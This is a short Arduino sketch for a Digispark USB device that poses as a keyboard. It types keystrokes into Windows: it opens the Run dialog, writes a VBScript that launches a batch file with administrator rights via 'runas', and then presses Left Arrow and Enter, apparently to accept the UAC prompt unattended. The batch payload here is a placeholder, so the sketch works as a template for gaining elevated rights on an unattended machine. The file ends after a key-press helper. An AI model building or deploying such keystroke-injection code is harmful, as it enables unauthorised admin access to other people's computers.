#include "DigiKeyboard.h"

// declare special key addresses
const char key_enter[] PROGMEM = "|";
const char key_arrow_left[] PROGMEM = "|";
const char fn_run[] PROGMEM = "}";

// store instructions in flash memory and read sequentially to save sram
const char line_0[] PROGMEM = "@@@@";
const char line_1[] PROGMEM = "cmd /k cd %temp%&echo|set /p=\"CreateObject(\"Shell.Application\").ShellExecute \"script.bat\",,\"\",\"runas\",1\">script.vbs&echo set /p DUMMY=Hit ENTER to continue...>script.bat&script.vbs&exit";

// instruction lookup table (execution order: left to right)
const char *const line_table[] PROGMEM = { fn_run, line_0, line_1, key_enter, line_0, key_arrow_left, line_0, key_enter };
const int NUM_INSTRUCTIONS = 8;

// presses the key associated with the key code
void pressSpecialKey(const char* address, bool fnDelay = false) {
  if (address == key_enter) {
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
  } else if (address == key_arrow_left) {
    DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  } else if (address == fn_run) {
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  }
}